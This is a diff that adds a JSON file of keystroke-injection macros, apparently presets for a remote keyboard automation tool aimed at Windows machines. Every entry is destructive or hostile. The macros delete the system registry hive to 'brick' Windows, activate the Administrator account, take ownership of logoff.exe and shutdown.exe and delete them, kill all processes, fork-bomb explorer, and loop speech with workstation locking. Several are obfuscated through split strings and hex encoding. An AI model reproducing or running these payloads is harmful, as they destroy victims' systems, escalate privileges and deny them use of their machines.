@@ -1,0 +1,42 @@
+[
+  {
+    "id": 1786351571908,
+    "label": "Brick Windows",
+    "content": "!combo win+r!wait 1!type reg delete \"HKLM\\SYSTEM\\ControlSet001\" /f!combo ctrl+shift+enter!wait 2!combo alt+y"
+  },
+  {
+    "id": 1786351647342,
+    "label": "Add Admin User",
+    "content": "!combo win+r !wait 1 !type cmd !combo ctrl+shift+enter !wait 3 !combo alt+y !wait 2 !send net user 11User /active:no !send net user Administrator /active:yes !send logoff"
+  },
+  {
+    "id": 1786351697485,
+    "label": "Delete Logoff (Admin User Needed)",
+    "content": "​!combo win+r !wait 1 !send cmd /k takeown /f %windir%\\System32\\logoff.exe /a&icacls logoff.exe /grant Everyone:F&del /s /f /q logoff.exe"
+  },
+  {
+    "id": 1786351715376,
+    "label": "Delete Shutdown (Admin User Needed)",
+    "content": "​!combo win+r !wait 1 !send cmd /k takeown /f %windir%\\System32\\shutdown.exe /a&icacls shutdown.exe /grant Everyone:F&del /s /f /q shutdown.exe"
+  },
+  {
+    "id": 1786351737484,
+    "label": "Quit Everything",
+    "content": "!combo win+r|!wait 1|!send taskkill /f /fi \"status eq running\""
+  },
+  {
+    "id": 1786351752895,
+    "label": "領域展開、強制終了。",
+    "content": "!combo win+r|!wait 1|!type cmd /k fo|!type r /l %|!send i in (1,1,9999999999999999999999999999999999999999999999999999999999999) do (start \"\" \"explorer.exe\")"
+  },
+  {
+    "id": 1786351775927,
+    "label": "Soggy Eh Lock",
+    "content": "!combo win+r|!wait 1|!type powershell while ($true){(new-object -co SAPI.SpVoice).Speak('soggy eh soggy eh'); ru|!type ndll32.exe us|!type er32.dll,Lo|!send ckWorkStation}"
+  },
+  {
+    "id": 1786351790390,
+    "label": "Launch & Speak Soggy",
+    "content": "!combo win+r|!wait 1|!send powershell -c \"for(;;){(new-object -co SAPI.SpVoice).Speak(-join('736f676779206568'-split'(..)'-ne''|%{[char][int]\\\"0x$_\\\"}));saps Z:/soggy.exe}\""
+  }
+]
